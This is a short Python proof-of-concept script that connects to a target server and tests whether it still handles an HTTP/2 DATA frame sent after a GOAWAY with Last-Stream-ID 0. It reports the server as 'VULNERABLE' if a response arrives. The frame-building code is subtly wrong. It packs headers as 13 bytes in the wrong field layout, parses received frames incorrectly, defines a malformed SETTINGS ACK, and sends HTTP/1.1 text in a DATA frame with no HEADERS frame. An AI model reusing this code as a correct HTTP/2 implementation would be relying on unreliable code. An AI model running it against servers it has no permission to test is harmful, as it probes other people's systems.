#!/usr/bin/env python3
import socket
import struct
import sys
import time

# HTTP/2 Constants
HTTP2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
SETTINGS_FRAME = b'\x00\x00\x00\x04\x00\x00\x00\x00\x00'  # Empty SETTINGS frame
GOAWAY_FRAME_TYPE = 0x07
DATA_FRAME_TYPE = 0x00
SETTINGS_ACK = b'\x00\x00\x04\x00\x01\x00\x00\x00\x00'  # SETTINGS ACK

def send_frame(sock, frame_type, flags, stream_id, payload):
    """Craft and send an HTTP/2 frame."""
    length = len(payload)
    frame_header = struct.pack('!IIB', length, frame_type, flags)
    frame_header += struct.pack('!I', stream_id & 0x7FFFFFFF)
    sock.sendall(frame_header + payload)
    print(f"[+] Sent Frame: Type={frame_type:#x}, Stream={stream_id}, Length={length}")

def receive_frame(sock):
    """Receive and parse an HTTP/2 frame header."""
    header = sock.recv(9)
    if len(header) < 9:
        return None
    length, frame_type, flags = struct.unpack('!IIB', header[:9])
    stream_id = struct.unpack('!I', header[4:8])[0]
    payload = b''
    while len(payload) < length:
        chunk = sock.recv(length - len(payload))
        if not chunk:
            break
        payload += chunk
    print(f"[-] Received Frame: Type={frame_type:#x}, Stream={stream_id}, Length={length}")
    return frame_type, flags, stream_id, payload

def main(target_host, target_port):
    print(f"[*] Connecting to {target_host}:{target_port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((target_host, target_port))
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)

    # Step 1: Send HTTP/2 Connection Preface
    print("[*] Sending HTTP/2 Connection Preface...")
    sock.sendall(HTTP2_PREFACE)
    
    # Step 2: Send empty SETTINGS frame and wait for ACK
    print("[*] Sending SETTINGS frame...")
    send_frame(sock, 0x01, 0x00, 0, b'')  # SETTINGS frame
    frame_type, flags, stream_id, payload = receive_frame(sock)
    if frame_type != 0x01 or not (flags & 0x01):  # Check for SETTINGS ACK
        print("[!] Did not receive SETTINGS ACK. Connection may not be HTTP/2.")
        sock.close()
        sys.exit(1)
    print("[+] Received SETTINGS ACK. Connection established.")

    # Step 3: Send GOAWAY with Last-Stream-ID = 0 (indicating no streams should be processed)
    print("[*] Sending GOAWAY frame with Last-Stream-ID = 0...")
    goaway_payload = struct.pack('!I', 0) + struct.pack('!I', 0x00)  # Last-Stream-ID=0, Error Code=NO_ERROR
    send_frame(sock, GOAWAY_FRAME_TYPE, 0x00, 0, goaway_payload)

    # Step 4: Send DATA frame on Stream 5 (higher than Last-Stream-ID)
    print("[*] Sending DATA frame on Stream 5 (higher than GOAWAY Last-Stream-ID)...")
    data_payload = b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'
    send_frame(sock, DATA_FRAME_TYPE, 0x01, 5, data_payload)  # END_STREAM flag set

    # Step 5: Observe server response
    print("[*] Waiting for server response...")
    time.sleep(1)
    try:
        response = sock.recv(4096)
        if response:
            print(f"[!] Server responded to frame on Stream 5 despite GOAWAY: {response[:100]}")
            print("[!] VULNERABLE: Server processed frames on streams higher than GOAWAY Last-Stream-ID.")
        else:
            print("[-] No response received. Server may have ignored the frame or closed connection.")
    except socket.timeout:
        print("[-] Timeout waiting for response. Server may have ignored the frame.")

    sock.close()
    print("[*] Connection closed.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python poc_goaway_last_stream_id_confusion.py <target_host> <target_port>")
        sys.exit(1)
    main(sys.argv[1], int(sys.argv[2]))